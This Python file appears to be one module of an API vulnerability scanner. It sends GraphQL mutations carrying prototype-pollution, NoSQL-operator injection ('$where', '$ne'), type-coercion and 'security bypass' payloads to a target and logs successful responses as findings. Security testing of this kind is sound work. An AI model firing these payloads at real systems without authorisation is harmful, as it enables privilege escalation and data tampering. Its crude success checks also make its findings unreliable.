#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
from RAGScripts.utils.logger import setup_scanner_logger

async def check_graphql_inputs(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for GraphQL input type abuse
        test_cases = [
            {
                'name': 'Input type pollution',
                'query': '''
                    mutation ($input: UserInput!) {
                        createUser(input: $input) {
                            success
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'name': 'test',
                        '__proto__': {'isAdmin': True},
                        'constructor': {'prototype': {'isPrivileged': True}}
                    }
                }
            },
            {
                'name': 'Input validation bypass',
                'query': '''
                    mutation ($data: DataInput!) {
                        processData(data: $data) {
                            result
                        }
                    }
                ''',
                'variables': {
                    'data': {
                        'value': {'$gt': 0},
                        'type': {'$ne': 'restricted'},
                        'filter': {'$where': 'true'}
                    }
                }
            },
            {
                'name': 'Input coercion attack',
                'query': '''
                    mutation ($settings: SettingsInput!) {
                        updateSettings(input: $settings) {
                            success
                        }
                    }
                ''',
                'variables': {
                    'settings': {
                        'maxUsers': '999999',
                        'isEnabled': 1,
                        'securityLevel': '0',
                        'permissions': 'admin'
                    }
                }
            },
            {
                'name': 'Nested input manipulation',
                'query': '''
                    mutation ($config: ConfigInput!) {
                        setConfig(config: $config) {
                            applied
                        }
                    }
                ''',
                'variables': {
                    'config': {
                        'system': {
                            'env': {'NODE_ENV': 'development'},
                            'debug': True,
                            'security': {'bypass': True}
                        }
                    }
                }
            }
        ]
        
        for test in test_cases:
            try:
                response = requests.post(
                    test_url,
                    json={
                        'query': test['query'],
                        'variables': test['variables']
                    },
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if is_input_vulnerable(response, test):
                    findings.append({
                        "type": "GraphQL Input Type Abuse",
                        "detail": f"Potential {test['name']} vulnerability",
                        "evidence": {
                            "url": test_url,
                            "query": test['query'],
                            "variables": test['variables'],
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in GraphQL input check: {str(e)}")
    
    return findings

def is_input_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        return False
    
    response_text = json.dumps(response_json).lower()
    
    # Check for input type pollution
    if test['name'] == 'Input type pollution':
        if response.status_code == 200:
            if 'success' in response_text and not response_json.get('errors'):
                return True
    
    # Check for input validation bypass
    if test['name'] == 'Input validation bypass':
        if response.status_code == 200:
            if 'result' in response_text and not response_json.get('errors'):
                return True
    
    # Check for input coercion success
    if test['name'] == 'Input coercion attack':
        if response.status_code == 200:
            if 'success' in response_text and not response_json.get('errors'):
                return True
    
    # Check for nested input manipulation
    if test['name'] == 'Nested input manipulation':
        if response.status_code == 200:
            if 'applied' in response_text and not response_json.get('errors'):
                return True
    
    # Check for error messages indicating input issues
    error_indicators = [
        'input type',
        'validation error',
        'coercion failed',
        'invalid input',
        'malformed input'
    ]
    
    if any(indicator in response_text for indicator in error_indicators):
        if response.status_code < 400:
            return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_graphql_inputs(
            "http://localhost:5000",
            "/graphql",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())